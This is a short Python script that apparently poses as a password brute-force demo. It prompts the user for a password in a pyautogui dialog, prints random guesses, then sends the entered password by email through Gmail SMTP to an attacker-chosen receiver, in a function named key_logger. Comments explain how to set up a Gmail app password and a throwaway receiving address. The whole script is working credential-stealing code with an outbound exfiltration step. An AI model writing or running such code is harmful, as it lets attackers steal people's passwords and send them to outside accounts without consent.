import random
import pyautogui
from email.message import EmailMessage
import ssl
import smtplib


def key_logger():
    while True:
        email_sender = ''
        email_password = '' #that password is not that you use normaly to login to email that is the aplication
                            # password from google account to generate that password you need to turn on
                            # 2-step verification on google account than you need to write in the end of url apppassword
                            # or click on the app password section under were you turn on the 2-step verification

        email_receiver = '' #you can use your other email or use temp email

        subject = "hasło"
        body = pwd

        em = EmailMessage()
        em['From'] = email_sender
        em['To'] = email_receiver
        em['Subject'] = subject
        em.set_content(body)

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(email_sender, email_password)
            smtp.sendmail(email_sender, email_receiver, em.as_string())

        print("email has been sent")

        break
        print("email has been sent")




chars = "abcdefghijklmnopqrstuvwxyz123456789!@#$%^&*"

allchar = list(chars)

pwd = pyautogui.password("Enter a password:")
sample_pwd = ""

while(sample_pwd != pwd):
    sample_pwd = random.choices(allchar, k=len(pwd))

    print("<=====" + str(sample_pwd) + "====>")

    if (sample_pwd == list(pwd)):
        print("The password is:", "".join(sample_pwd))

        key_logger()
        break


